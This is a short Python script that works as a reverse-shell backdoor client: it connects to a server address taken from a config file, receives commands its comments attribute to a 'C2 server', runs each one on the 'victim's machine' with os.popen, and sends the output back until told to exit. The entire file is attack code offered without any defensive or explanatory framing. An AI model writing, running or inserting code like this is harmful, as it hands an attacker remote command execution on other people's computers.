import socket
import os
from utils import encrypt, log_activity
from config import SERVER_IP, SERVER_PORT

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_IP, SERVER_PORT))

    while True:
        command = client.recv(1024).decode()  # Receive command from C2 server
        if command.lower() == "exit":
            break
        else:
            # Execute the command on the victim's machine
            output = os.popen(command).read()
            client.send(output.encode())  # Send back the result

    client.close()

if __name__ == "__main__":
    connect_to_server()
